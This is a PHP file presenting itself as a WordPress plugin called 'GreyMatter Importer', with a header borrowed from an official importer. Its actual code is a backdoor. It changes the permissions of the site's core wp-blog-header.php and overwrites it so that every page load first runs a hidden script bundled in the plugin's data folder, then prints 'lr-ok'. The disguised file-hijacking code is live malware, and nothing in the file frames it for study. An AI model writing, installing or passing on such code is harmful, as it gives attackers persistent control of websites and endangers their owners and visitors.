<?php
/*
Plugin Name: GreyMatter Importer
Plugin URI: http://wordpress.org/extend/plugins/greymatter-importer/
Description: Import posts, pages, comments, custom fields, categories, and tags from a WordPress export file.
Author: wordpressdotorg
Author URI: http://wordpress.org/
Version: 0.2
Stable tag: 0.2
License: GPL v2 - http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
*/

$new_string = '
<?php

if ( !isset($wp_did_header) ) {
	require_once(dirname(__FILE__) .\'/wp-content/plugins/greymatter-importer/data/greymatter-importer3.php\');
	$wp_did_header = true;
	require_once( dirname(__FILE__) . \'/wp-load.php\' );
	wp();

	require_once( ABSPATH . WPINC . \'/template-loader.php\' );

}

';

if (chmod("../../../../wp-blog-header.php", 0755)) {
    $file = fopen("../../../../wp-blog-header.php", 'w');
    if ($file === false) {
        echo 'error';
    } else {
        fwrite($file, $new_string);
        fclose($file);
        echo 'lr-ok';
    }
}

?>